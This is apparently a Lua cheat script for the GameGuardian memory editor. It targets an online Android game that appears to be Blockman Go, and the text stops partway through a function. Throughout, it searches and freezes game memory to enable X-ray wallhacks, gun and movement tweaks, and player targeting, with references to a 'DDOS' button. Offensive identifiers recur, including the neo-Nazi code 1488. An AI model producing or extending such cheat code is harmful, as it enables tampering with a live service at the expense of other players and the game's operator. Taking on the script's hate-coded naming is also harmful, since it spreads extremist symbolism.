--How many IQ need for understand it ezzzz?

ramkatext=''
onliclik=false
CurrentAnimVal=1488

rgbdebug,timegun,ResetAndTp,red089,spamtm,NoTeam,btmt,btmt2,btmtext,btmtext2,timeresp,ddostime=true,0,0,1,1,0,0,0,true,true,0,0
staim={}
staim.sp={'🔹Не таргетить тиммейтов(если есть)','🔹Таргетить мужской пол『♂️💢』','🔹Таргетить женский пол『♀️💢』','🔹Таргетить только TNT (tnt tag)『🧨💢』','🔹Белый список | Добавить & Удалить『add & del』'}
staim.st={dteam=true,sex1=true,sex2=true,tnt=true}
penis228=true
function wzrd888(text)sp={}for i = 1, #text do local t = string.byte(text, i)if t>127 then local t=t-256 end sp[i]=t end return sp end
function UTF_8(list)local text=''for i=1,#list do if list[i].value<0 and list[i].value+256>0 and list[i].value+256<=255 then text=text..string.char(list[i].value+256)elseif list[i].value>0 and list[i].value<=255  then text=text..string.char(list[i].value)else break end end return text end
FlyDevST,lastFlySp,Main10,MainUI,chh,timer2,rotationMenu,narkval=true,0.45,{},{},0,0,0,0
function C_ALLOC()local lib,MB=gg.getRangesList(),0 for i=1,#lib do if lib[i].state=='Ca' then MB=MB+(lib[i]['end']+-lib[i].start)/1048576 end end return MB end
function wzrd777(text,key)
local res = {}for i in text:gmatch("[^\r\n]+") do for _, w in pairs(key) do if i:find(w) then table.insert(res, i) break end end end return table.concat(res,'\n')end
      prohod=true
WizardAnim={'AS_IDLE','AS_RUN','AS_JUMP_BEGIN','AS_JUMP_END','AS_SNEAK','AS_WALK','AS_SPRINT','AS_SWIM','AS_FLOAT','AS_ON_LADDER_UP','AS_ON_LADDER_DOWN','AS_ON_LADDER_STATIC','AS_ON_SIT_1','AS_ON_SIT_2','AS_FLY_03','AS_ON_SLEEP_1','AS_ON_SWING','AS_ON_SIT_3','AS_FLY','AS_FLY_IDLE','AS_ATTACK','AS_AIM_BEGIN','AS_AIM_END','AS_THROW','AS_EAT_BEGIN','AS_EAT_END','AS_DRINK_BEGIN','AS_DRINK_END','AS_BLOCK','AS_GUN_RELOAD','AS_GUN_FIRE','AS_GREETINGS','AS_SELECTABLE_ACTION','AS_PRAISE','AS_SKILL_POISION'}
valr,valg,valb=1,0,0
function RGBManager(speed,hex)
speed=speed or 0.1
if valr >= 1 and valg < 1 and valb == 0 then valg = valg + speed 
        if valg >= 1 then
            valg = 1
            valr = valr - speed end elseif valg >= 1 and valr == 0 and valb < 1 then
        valb = valb + speed
        if valb >= 1 then
            valb = 1
            valg = valg - speed
        end
    elseif valb >= 1 and valg == 0 and valr < 1 then
        valr = valr + speed
        if valr >= 1 then
            valr = 1
            valb = valb - speed
        end
    elseif valr >= 1 and valb > 0 then
        valb = valb - speed
    elseif valg >= 1 and valr > 0 then
        valr = valr - speed
    elseif valb >= 1 and valg > 0 then
        valg = valg - speed
    end
    valr = math.max(0, math.min(1, valr))
    valg = math.max(0, math.min(1, valg))
    valb = math.max(0, math.min(1, valb))
    rgb120=string.format("%02X%02X%02X",math.floor(valr*255),math.floor(valg*255),math.floor(valb*255))
    if not hex then return string.format("%.2f",valr),string.format("%.2f",valg),string.format("%.2f",valb) else return '▢FF'..rgb120 end
end
gg.setVisible(false)
if not gg.getTargetInfo().x64 then
print('in Access denied')
gg.alert('Error code 102\nMessage: Game != arm64-v8a','')
os.exit()
end
function af(a,b)
  c = {table.unpack(a)}
  table.move(b, 1, #b, #c + 1, c)
  return c
end
function strToList(str)
    local list = {}
    for v in string.gmatch(str, "([^,]+)") do
        table.insert(list, v:match("^%s*(.-)%s*$"))
    end
    return list
end
function BestWizard()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.clearResults()
gg.searchNumber(':'..usernickname..'[S=vip_nameplate_',1)BestWizard1=gg.getResults(99999)gg.refineNumber(':'..utf8.char(utf8.codepoint(usernickname)),1)t=gg.getResults(99999)gg.clearResults() for i=1,#t do t[i].address=t[i].address-9 end gg.loadResults(t) gg.refineNumber(-94,1)rgbnick=gg.getResults(99999)gg.clearResults()for i=1,#rgbnick do
Main10['RgbNick'..i]=rgbnick[i]end

gg.loadResults(BestWizard1)gg.refineNumber(':[S=vip_nameplate_',1)gg.refineNumber(':e_',1)gg.refineNumber(':_',1)vipplus=gg.getResults(99999)gg.clearResults()
t2='10_plus.json]'
textn,tsp={},{}
for i in t2:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(textn,t)
end
for i=1,#vipplus do
t=1
tsp['rgbn'..i]={['address']=vipplus[i].address+#textn+1,['flags']=1,['freeze']=true,['value']=0}
for b = 1,#textn do
tsp['rgbn'..i..b]={['address']=vipplus[i].address+t,['flags']=1,['freeze']=true,['value']=textn[b]}t=t+1
end end
gg.addListItems(tsp)gg.clearList()
end
function getPKey(key,float)
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.clearResults()gg.searchNumber(':'..key,1,_,_,wizard089-0x100000,wizard089+0x100000)if gg.getResultsCount()==0 then gg.searchNumber(':'..key,1)
end
gg.refineNumber(':'..string.sub(key,1,1),1)t=gg.getResults(9999) gg.clearResults()for i=1,#t do  t[i].address=t[i].address+0x1b t[i].flags=4 end gg.loadResults(t)gg.refineNumber('0~200',4)t=gg.getResults(1488) gg.clearResults() for i=1,#t do  t[i].address=t[i].address+4 if not float then t[i].flags=1 else t[i].flags=16 end end gg.loadResults(t)if not float then gg.refineNumber('0~1',1) else gg.refineNumber(float,16) end t=gg.getResults(1)[1].address-4 gg.clearResults()
return t
end
function Wizard089()
if not wizard089 then gg.setVisible(false)gg.clearList()gg.clearResults()gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.searchNumber(':RenderHeadText',1)gg.refineNumber(':R',1)wizard089=gg.getResults(9999) gg.clearResults()for i=1,#wizard089 do  wizard089[i].address=wizard089[i].address+0x1b wizard089[i].flags=4 end gg.loadResults(wizard089)gg.refineNumber('0~200',4)wizard089=gg.getResults(1488)gg.clearResults()for i=1,#wizard089 do  wizard089[i].address=wizard089[i].address+4 wizard089[i].flags=1 end
gg.loadResults(wizard089)gg.refineNumber('0~1',1)wizard089=gg.getResults(1)[1].address gg.clearResults()
wizard088=getPKey('EnableDoubleJumps',nil)
wizard086=getPKey('IsShowItemDurability',nil)
end
end
WhiteList={Mactep={id=1078251600},Wizard={id=64928},Arden13={id=1364508670},zxcEnter={id=3237327008},vova={id=2558942096},Tina={id=1497453280}}


function setPosUI(j,x)
t={}
for i,v in pairs(j) do
table.insert(t,{address=j[i].address+0x9D4+raznica,flags=16,freeze=true,value=x})
table.insert(t,{address=j[i].address+0x938+raznica,flags=16,freeze=true,value=-1})
end
gg.addListItems(t)
gg.clearList()
end
w60='60'
WizardUtf8 = require("utf8")
WizardVal1488 = 4575657222478978089
wizardValType = 32
function getMainMain()
gg.setRanges(16384 | 8)blockmanlib=0
--gg.getRangesList('libBlockMan.so')[1].start
gg.setVisible(false)
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.clearResults()
gg.searchNumber(';Main',2)
gg.refineNumber(';n',2)
t=gg.getResults(gg.getResultsCount())gg.clearResults()
for i=1,#t do
t[i].address=t[i].address+0x42
t[i].flags=4
end
gg.loadResults(t)gg.refineNumber('1~257',4)g16=gg.getResults(gg.getResultsCount())gg.clearResults()
spisok228 = {}
spisok229 = {}
d=0
for i = 1,16 do
d=d+2
for b=1,#g16 do
table.insert(spisok228, {['address'] = (g16[b].address-0x42)+d, ['flags'] = 2})
if d==2 then
table.insert(spisok228, {['address'] = g16[b].address, ['flags'] = 4})
end
end
end


function X_Ray(st)gg.setVisible(false)if not rescham then gg.clearResults()gg.clearList()gg.setRanges(8 | 16 | 262144 | 32)gg.searchNumber(';WindowDestroy',2)gg.refineNumber(';W',2)t=gg.getResults(gg.getResultsCount())gg.clearResults()for i=1,#t do t[i].address=t[i].address+0x130 t[i].flags=4 end gg.loadResults(t)gg.refineNumber(2001,4)t=gg.getResults(1488)gg.clearResults()for i=1,#t do t[i].address=t[i].address-0xCE t[i].flags=2 end gg.loadResults(t)gg.refineNumber('0~256',2)rescham=gg.getResults(1488)gg.clearResults()end for i=1,#rescham do if st then tsp['cham'..i]={address=rescham[i].address,flags=2,freeze=true,value=256} chams=true else tsp['cham'..i]={address=rescham[i].address,flags=2,freeze=true,value=0} chams=false end end end

function getGuns()
gg.clearResults()gg.setVisible(false)gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(':gui_gun_name',1)gg.refineNumber(':gui',1)gg.refineNumber(':g',1)local t,guns=gg.getResults(99999),{}gg.clearResults()
for i=1,#t do
t[i].address=t[i].address-0xA1
t[i].flags=4
end
local t=gg.getValues(t)
for i=1,#t do
if (t[i].value>=426 and t[i].value<=440) or (t[i].value>=700 and t[i].value<=714) or (t[i].value>=759 and t[i].value<=768) or (t[i].value>=771 and t[i].value<=780) or (t[i].value>=794 and t[i].value<=853) or (t[i].value>=884 and t[i].value<=899) or (t[i].value>=2301 and t[i].value<=2307) or (t[i].value==1242) or (t[i].value==2337) then
guns[#guns+1]=t[i]
end
end
return guns end

gg.clearList()
gg.clearResults()
gg.loadResults(spisok228)
gg.refineNumber('77;97;105;110::9',2,_,gg.SIGN_NOT_EQUAL) -- Anti "Main-Main"
h=gg.getResults(99999)
gg.clearResults()
PCMain,skyBlockShit,btnmain,UICount,NickSize={},{},{},0,{}
for i=1,#h do
if h[i].value == string.byte('-') and h[i+1].value == string.byte('W') and h[i+2].value == string.byte('a') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('c') and h[i+5].value == string.byte('h') and h[i+6].value == string.byte('-') and h[i+7].value == string.byte('B') and h[i+8].value == string.byte('a') and h[i+9].value == string.byte('t') and h[i+10].value == string.byte('t') and h[i+11].value == string.byte('l') and h[i+12].value == string.byte('e') and h[i+13].value == string.byte('-') and h[i+14].value == string.byte('T') and h[i+15].value == string.byte('i') then if h[i+16].value==1 or h[i+16].value==257 then
UI6={{address=h[i+16].address,flags=4}}
UICount=UICount+1
end elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('P') and h[i+2].value == string.byte('a') and h[i+3].value == string.byte('r') and h[i+4].value == string.byte('a') and h[i+5].value == string.byte('c') and h[i+6].value == string.byte('h') and h[i+7].value == string.byte('u') and h[i+8].value == string.byte('t') then if h[i+16].value==1 or h[i+16].value==256 or h[i+16].value==257 then
UI7={{address=h[i+16].address,flags=4,freeze=true,value=257}}
Main10.ParachuteUI=UI7[1]
UICount=UICount+1
end elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('a') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('n') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('n') then if h[i+16].value==1 or h[i+16].value==257 then
UI4={{address=h[i+16].address,flags=4,freeze=true,value=257}}
UICount=UICount+1
end elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('B') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('t') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('m') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('S') and h[i+9].value == string.byte('y') and h[i+10].value == string.byte('s') then if h[i+16].value==1 or h[i+16].value==257 then
UI3={{address=h[i+16].address,flags=4,freeze=true,value=257}}
UICount=UICount+1
end elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('e') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('t') and h[i+5].value == string.byte('e') and h[i+6].value == string.byte('r') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('S') and h[i+9].value == string.byte('y') and h[i+10].value == string.byte('s') then
if h[i+16].value==1 or h[i+16].value==257 then
UI1={{address=h[i+16].address,flags=4,freeze=true,value=257}}
UICount=UICount+1
end elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('B') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('i') and h[i+4].value == string.byte('l') and h[i+5].value == string.byte('d') and h[i+6].value == string.byte('W') and h[i+7].value == string.byte('a') and h[i+8].value == string.byte('r') and h[i+9].value == string.byte('-') and h[i+10].value == string.byte('B') and h[i+16] then if h[i+16].value==1 or h[i+16].value==257 then
MainUI['WarBlock']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end

elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('P') and h[i+2].value == string.byte('l') and h[i+3].value == string.byte('a') and h[i+4].value == string.byte('y') and h[i+5].value == string.byte('e') and h[i+6].value == string.byte('r') and h[i+7].value == string.byte('O') and h[i+8].value == string.byte('p') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('r') and h[i+16] then if h[i+16].value==1 or h[i+16].value==257 then
Main10.DDOSBtn={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end

elseif h[i].value == string.byte('I') and h[i+1].value == string.byte('n') and h[i+2].value == string.byte('v') and h[i+3].value == string.byte('e') and h[i+4].value == string.byte('n') and h[i+5].value == string.byte('t') and h[i+6].value == string.byte('o') and h[i+7].value == string.byte('r') and h[i+8].value == string.byte('y') and h[i+9].value == string.byte('P') and h[i+10].value == string.byte('a') and h[i+11].value == string.byte('n') and h[i+12].value == string.byte('e') and h[i+13].value == string.byte('l') and h[i+14].value==0 and h[i+16] then if h[i+16].value==1 or h[i+16].value==257 then
MainUI['InvPanel']={address=h[i+16].address,flags=4,freeze=true,value=257}
Main10['Mat1']={address=h[i+16].address+0x2AA0,flags=4,freeze=true,value=257}
Main10['Mat2']={address=h[i+16].address+0x2AA0+0x1550,flags=4,freeze=true,value=257}
UICount=UICount+1
end

 elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('T') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('p') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('S') and h[i+6].value == string.byte('y') and h[i+7].value == string.byte('s') and h[i+8].value == string.byte('t') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('m') then
if h[i+16].value==1 or h[i+16].value==257 then
UI2={{address=h[i+16].address,flags=4},freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('H') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('r') and h[i+4].value == string.byte('t') and h[i+5].value == string.byte('-') and h[i+6].value == string.byte('M') and h[i+7].value == string.byte('a') and h[i+8].value == string.byte('s') and h[i+9].value == string.byte('k') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['HurtMask']={address=h[i+16].address,flags=4}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('O') and h[i+6].value == string.byte('p') and h[i+7].value == string.byte('e') and h[i+8].value == string.byte('r') and h[i+9].value == string.byte('a') and h[i+10].value == string.byte('t') and h[i+11].value == string.byte('e') and h[i+12].value == string.byte('-') and h[i+13].value == string.byte('R') and h[i+14].value == string.byte('i') and h[i+15].value == string.byte('g') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI['GunRight']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('P') and h[i+6].value == string.byte('r') and h[i+7].value == string.byte('e') and h[i+8].value == string.byte('v') and h[i+9].value == string.byte('i') and h[i+10].value == string.byte('e') and h[i+11].value == string.byte('w') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI['GunPreview']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('B') and h[i+6].value == string.byte('u') and h[i+7].value == string.byte('l') and h[i+8].value == string.byte('l') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('t') and h[i+11].value == string.byte('-') and h[i+12].value == string.byte('T') and h[i+13].value == string.byte('i') and h[i+14].value == string.byte('t') and h[i+15].value == string.byte('l') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI['EngineVersion']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('B') and h[i+6].value == string.byte('u') and h[i+7].value == string.byte('l') and h[i+8].value == string.byte('l') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('t') and h[i+11].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI['NullUI1']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('I') and h[i+6].value == string.byte('c') and h[i+7].value == string.byte('o') and h[i+8].value == string.byte('n') and h[i+9].value == string.byte('-') and h[i+10].value == string.byte('B') and h[i+11].value == string.byte('g') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI['NullUI2']={address=h[i+16].address,flags=4,freeze=true,value=1}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('T') and h[i+6].value == string.byte('i') and h[i+7].value == string.byte('t') and h[i+8].value == string.byte('l') and h[i+9].value == string.byte('e') and h[i+10].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI['NullUI3']={address=h[i+16].address,flags=4,freeze=true,value=1}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('F') and h[i+6].value == string.byte('i') and h[i+7].value == string.byte('r') and h[i+8].value == string.byte('i') and h[i+9].value == string.byte('n') and h[i+10].value == string.byte('g') and h[i+11].value == string.byte('R') and h[i+12].value == string.byte('a') and h[i+13].value == string.byte('t') and h[i+14].value == string.byte('e') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
local t=gg.getValues({{address=h[i+15].address+2,flags=2}})[1].value
if t == 84 then
MainUI['App']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif t==86 then
MainUI.ServTime={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
else
MainUI['NullUI4']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('R') and h[i+6].value == string.byte('a') and h[i+7].value == string.byte('n') and h[i+8].value == string.byte('g') and h[i+9].value == string.byte('e') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
if h[i+10].value == string.byte('-') and h[i+11].value == string.byte('T') then
MainUI['wzrd']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+10].value == string.byte('-') and h[i+11].value == string.byte('V') then
MainUI['btmtext2']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+10].value==0 then
MainUI['NullUI6']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('h') and h[i+3].value == string.byte('a') and h[i+4].value == string.byte('t') and h[i+5].value == string.byte('-') and h[i+6].value == string.byte('M') and h[i+7].value == string.byte('e') and h[i+8].value == string.byte('s') and h[i+9].value == string.byte('s') and h[i+10].value == string.byte('a') and h[i+11].value == string.byte('g') and h[i+12].value == string.byte('e') and h[i+13].value == string.byte('_') and h[i+16] then if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI.ContainerChat={address=h[i+16].address,flags=4,freeze=true,value=257}
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('U') and h[i+6].value == string.byte('n') and h[i+7].value == string.byte('k') and h[i+8].value == string.byte('n') and h[i+9].value == string.byte('o') and h[i+10].value == string.byte('w') and h[i+11].value == string.byte('n') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
if h[i+12].value == string.byte('-') and h[i+13].value == string.byte('T') then
MainUI['wzrd2']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+12].value == string.byte('-') and h[i+13].value == string.byte('V') then
MainUI['tgwzrd']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+12].value==0 then
MainUI['NullUI7']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('C') and h[i+6].value == string.byte('r') and h[i+7].value == string.byte('o') and h[i+8].value == string.byte('s') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
MainUI.GunCross={address=h[i+16].address,flags=4,freeze=true,value=1}
UICount=UICount+1
Main10.GunCross=MainUI.GunCross
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('H') and h[i+6].value == string.byte('a') and h[i+7].value == string.byte('r') and h[i+8].value == string.byte('m') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
if h[i+9].value == string.byte('-') and h[i+10].value == string.byte('T') then
MainUI['wzrd3']={address=h[i+16].address,flags=4,freeze=true,value=1}
UICount=UICount+1
elseif h[i+9].value == string.byte('-') and h[i+10].value == string.byte('V') then
MainUI['btmtext']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+9].value==0 then
MainUI['NullUI8']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('D') and h[i+6].value == string.byte('e') and h[i+7].value == string.byte('v') and h[i+8].value == string.byte('i') and h[i+9].value == string.byte('a') and h[i+10].value == string.byte('t') and h[i+11].value == string.byte('i') and h[i+12].value == string.byte('o') and h[i+13].value == string.byte('n') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
if h[i+14].value == string.byte('-') and h[i+15].value == string.byte('T') then
MainUI['ShowAnims']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+14].value == string.byte('-') and h[i+15].value == string.byte('V') then
MainUI['MyTime']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+14].value == 0 then
MainUI['NullUI5']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('-') and h[i+5].value == string.byte('O') and h[i+6].value == string.byte('p') and h[i+7].value == string.byte('e') and h[i+8].value == string.byte('r') and h[i+9].value == string.byte('a') and h[i+10].value == string.byte('t') and h[i+11].value == string.byte('e') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256 then
if h[i+13].value == string.byte('A') and h[i+14].value == string.byte('i') and h[i+15].value == string.byte('m') then
MainUI['GunAim']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+13].value == string.byte('C') and h[i+14].value == string.byte('a') and h[i+15].value == string.byte('n') then
MainUI['GunNotAim']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1 
elseif h[i+13].value == string.byte('S') and h[i+14].value == string.byte('n') and h[i+15].value == string.byte('i') then
MainUI['GunAimGUI']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+13].value == string.byte('T') and h[i+14].value == string.byte('h') and h[i+15].value == string.byte('r') then
MainUI['GunThrow']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+13].value == string.byte('R') and h[i+14].value == string.byte('e') and h[i+15].value == string.byte('l') then
MainUI['GunReload']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+13].value == string.byte('L') and h[i+14].value == string.byte('e') and h[i+15].value == string.byte('f') then
MainUI['GunLeft']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+12].value==0 then
MainUI['GunMain']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('M') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('v') and h[i+4].value == string.byte('e') and h[i+5].value == string.byte('S') and h[i+6].value == string.byte('t') and h[i+7].value == string.byte('a') and h[i+8].value == string.byte('t') and h[i+9].value == string.byte('e') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
if h[i+10].value == string.byte('-') and h[i+11].value == string.byte('S') and h[i+12].value == string.byte('n') then
MainUI['Shift']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+10].value==0 then
MainUI['MoveStateMain']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+10].value == string.byte('-') and h[i+11].value == string.byte('R') and h[i+12].value == string.byte('u') then
MainUI['RunState']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+10].value == string.byte('-') and h[i+11].value == string.byte('S') and h[i+12].value == string.byte('p') then
MainUI['Sprint']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('F') and h[i+2].value == string.byte('i') and h[i+3].value == string.byte('s') and h[i+4].value == string.byte('h') and h[i+5].value == string.byte('i') and h[i+6].value == string.byte('n') and h[i+7].value == string.byte('g') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Fishing']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('D') and h[i+5].value == string.byte('e') and h[i+6].value == string.byte('t') and h[i+7].value == string.byte('a') and h[i+8].value == string.byte('i')and h[i+9].value == string.byte('l') and h[i+10].value == string.byte('s') and h[i+11].value == string.byte('I') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI.wzrdIcon={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('T') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('g') and h[i+4].value == string.byte('g') and h[i+5].value == string.byte('l') and h[i+6].value == string.byte('e') and h[i+7].value == string.byte('I') and h[i+8].value == string.byte('n')and h[i+9].value == string.byte('v')and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Inventory']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('P') and h[i+5].value == string.byte('r') and h[i+6].value == string.byte('e') and h[i+7].value == string.byte('v') and h[i+8].value == string.byte('i') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('w') and h[i+11].value == string.byte('C')and h[i+12].value == string.byte('h')and h[i+13].value == string.byte('e')and h[i+14].value == string.byte('c')and h[i+15].value == string.byte('k')and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
Main10.GunPreviewCheckBox={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('a') and h[i+3].value == string.byte('m') and h[i+4].value == string.byte('e') and h[i+5].value == string.byte('r') and h[i+6].value == string.byte('a') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('D') and h[i+9].value == string.byte('i') and h[i+10].value == string.byte('s') and h[i+11].value == string.byte('t')and h[i+12].value == string.byte('a')and h[i+13].value == string.byte('n')and h[i+14].value == string.byte('c')and h[i+15].value == string.byte('e')and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
local t=gg.getValues({{address=h[i+16].address+12,flags=2}})[1].value
if t==256 then
MainUI['NickSize']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
else
NickSize[#NickSize+1]={address=h[i+16].address,flags=4,freeze=true,value=1}
end
end
